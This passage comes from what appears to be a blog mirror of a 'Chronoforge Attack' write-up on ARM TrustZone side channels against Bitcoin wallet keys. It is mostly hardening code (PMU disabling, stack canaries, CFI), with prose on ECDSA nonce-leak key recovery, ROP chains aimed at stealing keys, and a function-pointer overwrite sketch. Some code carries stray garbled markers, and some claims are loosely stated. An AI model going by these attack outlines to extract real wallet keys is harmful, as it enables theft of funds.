<h3 class="wp-block-heading">Scenario 2: Mobile Wallet (without TrustZone)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#scenario-2-mobile-wallet-without-trustzone"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For wallets on regular processors without such protection:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>A private key can be stolen for 6-200 signatures[^3][^20][^22]</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>It is necessary to use a constant-time implementation <a href="https://cryptou.ru/vulncipher/transaction">of ECDSA</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core</a> ‘s libsecp256k1 is protected against timing attacks.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">KEY FINDINGS FOR SECURITY RESEARCHERS</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#key-findings-for-security-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>MPU isolation</strong> prevents direct access to Secure Cache memory</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Random cache replacement</strong> is a simple but effective way to protect against Prime+Probe, and it works even with a shared cache.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Disabling cross-world coherency</strong> removes the covert channel between TrustZone worlds.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Combined defense</strong> is more effective than individual measures. Even if one measure is bypassed, the others will stop the attack.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>For Bitcoin</strong> , this means that on nRF5340 microcontrollers, <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> receive strong protection against cache-based side-channel attacks.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">RECOMMENDATIONS</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#recommendations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>For wallet developers:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Use processors with TrustZone + separate cache for Secure World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Make sure cache isolation is enabled correctly in the firmware.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Check the MPU configuration and cache replacement policy</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">6.3.2 Disable Performance Counters in Normal World</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#632-disable-performance-counters-in-normal-world"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Disable Performance Counters in Normal World</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#disable-performance-counters-in-normal-world"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Prevent Normal World from accessing PMU counters<br><br>void disable_pmu_normal_world(void) {<br>    // Reset PMU<br>    uint32_t pmcr = 0x1 | 0x2 | 0x4 | 0x8;<br>    arm_pmu_write_PMCR(pmcr);<br><br>    // Clear counter enables<br>    uint32_t pmcnten = 0;<br>    arm_pmu_write_PMCNTENCLR(pmcnten);<br><br>    // Configure access control - deny NS access<br>    uint32_t pmuacr = 0x1 | 0x2 | 0x4 | 0x8;<br>    arm_pmu_write_PMUACR(pmuacr);<br><br>    // Lock configuration<br>    arm_pmu_lock_configuration();<br>}<br><br>// VERIFICATION: Test that Normal World cannot read PMU<br>int verify_pmu_access_denied(void) {<br>    uint32_t test_read = arm_pmu_read_PMCCNTR();<br>    // Should generate HardFault with MemManage Fault cause<br>    return (test_read == 0xDEADBEEF);  // Sentinel<br>}<br><br>// REMEDIATION:<br>// 1. Disable PMU at boot<br>// 2. Set NS denial bits<br>// 3. Lock configuration<br>// 4. Test at boot<br>// 5. Require secure RMA to unlock</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Code Analysis: Disabling the Performance Monitor Unit (PMU) in Normal World on ARM TrustZone</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#code-analysis-disabling-the-performance-monitor-unit-pmu-in-normal-world-on-arm-trustzone"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The presented code implements a&nbsp;<strong>hardened isolation</strong>&nbsp;mechanism between the Secure World and the Normal World in the ARM TrustZone architecture. Its primary purpose is to prevent leakage of confidential information through the Performance Monitoring Unit (PMU), which could be used for&nbsp;<strong>timing side-channel attacks</strong>&nbsp;against cryptographic operations running in the Secure World, including operations with secp256k1 private keys and&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA signatures.</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Why is this critical for Bitcoin?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#why-is-this-critical-for-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Performance Monitor Unit allows Normal World users to capture&nbsp;<strong>processor performance metrics</strong>&nbsp;, such as instruction counts, cache misses, branch predictors, and more. Researchers (specifically, Li et al. 2022) have demonstrated that these metrics&nbsp;<strong>correlate with cryptographic operations</strong>&nbsp;in Secure World, allowing private keys to be recovered with 99% accuracy through machine learning decoding of the PMU footprint. For&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;storing private keys in the TEE (Trusted Execution Environment), this vulnerability means complete compromise of funds.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-29-1024x771.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-29-1024x771.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Protecting wallets in ARM TrustZone</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1-protecting-wallets-in-arm-trustzone"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">a Bitcoin wallet&nbsp;</a><em>(e.g. built into a mobile phone)</em>&nbsp;stores&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;in a TEE using this mechanism:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Private Key</strong> : Remains in Secure World memory</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/transaction"><strong>ECDSA signature</strong> :</a> Computed in Secure World via secp256k1 point multiplication operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>PMU disabled</strong> : Normal World application (even malicious one) cannot measure the timing of an operation</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Result</strong> : Timing side-channel attack to recover the key is not possible.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Detecting compromised devices</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-detecting-compromised-devices"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>A researcher can create a test&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a>&nbsp;and:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Perform multiple signatures on the same message</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Measure variance in timing (if possible via public API)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If variance is present and correlated, PMU is available (vulnerability!)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If not, the protection works.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Vulnerability analysis of real implementations</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-vulnerability-analysis-of-real-implementations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Common errors:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>❌ Disabled only by cycles, but event counters remain active</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>❌ PMUACR is configured incorrectly (not all bits are set)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>❌ No blocking applied (can be reconfigured from Secure World!)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>❌ No testing is performed (initialization failure is invisible)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This code implements&nbsp;<strong>all</strong>&nbsp;these levels correctly.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Connection with cryptographic vulnerabilities</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#connection-with-cryptographic-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>1. ECDSA on secp256k1</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1-ecdsa-on-secp256k1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ECDSA signature&nbsp;<code>(r, s)</code>is calculated as:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code><strong>s = k^-1 * (hash(m) + d*r) mod n</strong></code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Where&nbsp;<code>k</code>is a random nonce,&nbsp;<code>d</code>is&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">a private key.</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Timing leak</strong>&nbsp;: The point multiplication operation&nbsp;<code>[k]G</code>takes variable time depending on&nbsp;<strong>the bit-pattern</strong>&nbsp;value&nbsp;<code>k</code>. If&nbsp;<code><strong><a href="https://cryptou.ru/vulncipher/attack">k</a></strong></code>reused and an attacker can measure the timing, they can recover&nbsp;<code>k</code>and then compute&nbsp;<code>d = (s*k - hash(m)) / r</code></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>2. Weak Nonce Attack</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-weak-nonce-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If the system generates weak nonces&nbsp;<code>k</code>(with low entropy), a PMU-based timing attack can reveal this:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Poor generation <code>k</code>= more predictable execution time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The attacker sees a pattern in PMU measurements</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Restores low-entropy nonces</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Calculates the private key using the LLL solution of the system of equations</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>This code prevents even such&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attacks</a></strong>&nbsp;, since it eliminates the very possibility of measuring timing.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>3. Fault Injection + PMU Covert Channel</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-fault-injection--pmu-covert-channel"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/chronoforge-attack">Researchers</a>&nbsp;have shown that it is possible&nbsp;<strong>to combine</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Fault injection</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>PMU-based covert channel (error information leak)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Result: recovery&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key</a>&nbsp;even if a fault is detected.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This protection makes such attacks impossible.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This code represents&nbsp;<strong>state-of-the-art</strong>&nbsp;protection against PMU-based timing side-channels for cryptographic operations in ARM TrustZone. Its implementation is critical for:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>✅ <strong><a href="https://cryptou.ru/vulncipher/bitcoin">Mobile Bitcoin wallets</a></strong> that store keys in TEE</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✅ <strong>Hardware wallets</strong> based on ARM Cortex-M with TEE (e.g., Ledger, Trezor)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✅ <strong>IoT devices</strong> with sensitive cryptographic operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✅ <strong>Enterprise</strong> key management solutions</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-31-1024x608.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-31-1024x608.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Firmware-Level Hardening</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#firmware-level-hardening"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Stack Canaries and CFI</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#stack-canaries-and-cfi"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Stack Canaries and Control Flow Integrity</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#stack-canaries-and-control-flow-integrity"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Stack Canary and CFI Protection<br>// Compile with: -fstack-protector-strong -fcf-protection=full<br><br>void ecdsa_sign_with_canary(<br>    const uint8_t *private_key,<br>    const uint8_t *message,<br>    uint8_t *signature<br>) {<br>    // Compiler automatically inserts canary:<br>    // [local_vars][CANARY][saved_rbp][return_addr]<br><br>    uint8_t temp_buffer[64];  // Vulnerable buffer<br><br>    // If overflow corrupts canary:<br>    // Function epilogue detects mismatch<br>    // __stack_chk_fail() aborts program<br>    // Prevents ROP attacks<br><br>    ecdsa_sign_secp256k1_safe(private_key, message, signature);<br><br>    // Compiler inserts: if (CANARY != __stack_chk_guard) abort();<br>}<br><br>// EFFECTIVENESS:<br>// - Prevents buffer overflow exploitation<br>// - Prevents ROP attacks<br>// - Prevents COP attacks<br>// - Overhead: ~1-2% performance</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This code demonstrates a fundamental mechanism for protecting the ECDSA (Elliptic Curve Digital Signature Algorithm) cryptographic operations used in&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin</a>&nbsp;from buffer overflow and control flow hijacking&nbsp;<a href="https://cryptou.ru/vulncipher/attack">attacks</a>&nbsp;. Stack canaries and Control Flow Integrity (CFI) are critical protections for applications that work with&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;, where a compromise could lead to theft of funds.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Stack memory structure and canary placement</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#stack-memory-structure-and-canary-placement"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">The compiler automatically inserts protection:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#the-compiler-automatically-inserts-protection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>[local_vars][CANARY][saved_rbp][return_addr]</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Stack element</th><th>Size</th><th>Purpose</th></tr></thead><tbody><tr><td>local_vars</td><td>variable</td><td>Local function variables (including vulnerable buffers)</td></tr><tr><td><strong>CANARY</strong></td><td>8 bytes (x64) / 4 bytes (x86)</td><td>Checksum value for overflow detection</td></tr><tr><td>saved_rbp</td><td>8/4 bytes</td><td>Saved base frame pointer</td></tr><tr><td>return_addr</td><td>8/4 bytes</td><td>Return address to the calling function</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Key defense mechanisms:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#key-defense-mechanisms"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>__stack_chk_guard</strong> is a global variable containing a secret random canary value initialized at program startup.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>__stack_chk_fail()</strong> is a handler function that is called when canary corruption is detected and immediately terminates the program.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>-fstack-protector-strong</strong> is a GCC/Clang compiler flag that inserts a canary into all functions with char arrays on the stack.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>-fcf-protection=full</strong> — enables hardware protection for Intel CET (Control-flow Enforcement Technology)</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Detailed code analysis (English)</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#detailed-code-analysis-english"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Stack Canary and CFI Protection for ECDSA signing
// Compile with: gcc -fstack-protector-strong -fcf-protection=full -o secure_sign secure_sign.c

void ecdsa_sign_with_canary(
    const uint8_t *private_key,  // 32-byte secp256k1 private key
    const uint8_t *message,       // Message hash to sign
    uint8_t *signature           // Output buffer for signature (64-72 bytes)
) {
    // === COMPILER-GENERATED PROLOGUE (hidden) ===
    // push %rbp
    // mov %rsp, %rbp
    // sub $0x50, %rsp              // Allocate 80 bytes for locals
    // mov __stack_chk_guard(%rip), %rax  // Load global canary value
    // mov %rax, -0x8(%rbp)         // Store canary at &#91;rbp-8]
    // &#91;local_vars]&#91;CANARY]&#91;saved_rbp]&#91;return_addr]
    // ^rpb-0x50    ^rbp-8   ^rbp    ^rbp+8

    uint8_t temp_buffer&#91;^64];  // Vulnerable buffer on stack
                              // Located at rbp-0x50 to rbp-0x10

    // POTENTIAL ATTACK VECTOR:
    // If attacker overflows temp_buffer beyond 64 bytes:
    // - Bytes 65-72 will overwrite the canary value
    // - Bytes 73-80 will overwrite saved_rbp
    // - Bytes 81-88 will overwrite return address (CRITICAL)

    // === SECURITY CHECK ===
    // Before return, compiler inserts:
    // mov -0x8(%rbp), %rax         // Load stored canary
    // xor __stack_chk_guard(%rip), %rax  // Compare with global
    // jne __stack_chk_fail         // If mismatch, abort

    // This prevents ROP attacks by detecting stack corruption
    // before control flow can be hijacked

    // Actual ECDSA signing operation (assumed safe implementation)
    ecdsa_sign_secp256k1_safe(private_key, message, signature);

    // === COMPILER-GENERATED EPILOGUE (hidden) ===
    // mov -0x8(%rbp), %rax         // Load stored canary
    // xor __stack_chk_guard(%rip), %rax  // Verify integrity
    // jne __stack_chk_fail         // Abort if corrupted
    // leave                        // Restore rbp
    // ret                          // Safe return
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Protection against ROP (Return-Oriented Programming) attack</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#protection-against-rop-return-oriented-programming-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How does a ROP attack work?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-does-a-rop-attack-work"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Buffer overflow</strong> → overwriting the return address on the stack</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Control redirection</strong> → execution of short code fragments (gadgets) ending in<code>ret</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Gadget chain</strong> → sequential execution of malicious operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Stealing <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a></strong> → exporting key material from memory</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How canary prevents ROP:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-canary-prevents-rop"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>[Vulnerable buffer][CANARY][…][return_addr]</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Overflow must overwrite CANARY</strong> before reaching the return address</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Canary check detects corruption</strong> in function epilogue</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>__stack_chk_fail() immediately terminates the process</strong> before executing the attack.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>An attacker cannot predict or recover the canary</strong> (random value)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Intel CET Hardware Protection:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#intel-cet-hardware-protection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><code>-fcf-protection=full</code>includes:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Shadow stack</strong> – a hardware copy of return addresses that is write-protected</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Indirect Branch Tracking (IBT)</strong> — checking the legitimacy of indirect branch target addresses</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Prevents even invisible ROP attacks</strong> that bypass software canaries</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Protection against COP (Call-Oriented Programming) attacks</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#protection-against-cop-call-oriented-programming-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">COP attacks against&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA:</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#cop-attacks-againstecdsa"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>COP uses indirect function calls (&nbsp;<code>call [function_pointer]</code>) instead of&nbsp;<code>ret</code>. Attacker:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Overwrites function pointers (for example, in virtual function tables)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Redirects calls to malicious devices</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bypasses some protections that are only targeted at<code>ret</code></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">How CFI prevents COP:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#how-cfi-prevents-cop"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Control Flow Integrity</strong>&nbsp;limits the allowed targets of indirect transitions:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Forward-edge CFI</strong> ( <code>-fcf-protection</code>): ensures that <code>call [rax]</code>it can only reach legitimate functions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Fine-grained CFI</strong> : Creates a “whitelist” of acceptable addresses for each call site</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core uses CFI</a></strong> to secure cryptographic operations.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Practical example:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-example"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Без CFI - уязвимость:
typedef void (*sign_func)(...);
sign_func func_table&#91;^2] = {ecdsa_sign, malicious_sign};

// Атакующий перезаписывает func_table&#91;^0]
// При вызове func_table&#91;^0]() выполняется вредоносный код

// С CFI - защита:
// Компилятор вставляет проверку:
// if (target_address ∉ valid_functions) abort();</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
